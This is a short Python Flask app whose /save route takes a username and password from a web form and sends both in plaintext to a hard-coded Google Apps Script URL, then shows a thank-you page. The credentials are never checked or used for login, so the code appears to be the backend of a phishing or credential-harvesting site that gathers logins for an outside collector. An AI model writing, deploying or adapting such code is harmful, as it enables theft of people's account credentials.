from flask import Flask, render_template, request
import requests

app = Flask(__name__)

SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxAoHOGuUs5sX0WGyx3J0T71o_vM7FN51kMF8J8dvjmmFFzdX7z2vDW9fcRV4RSYfKw4g/exec"

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/save", methods=["POST"])
def save():
    username = request.form["username"]
    password = request.form["password"]

    data = {
        "username": username,
        "password": password
    }

    requests.post(SCRIPT_URL, json=data)

    return render_template("thankyou.html", user=username)

if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port)
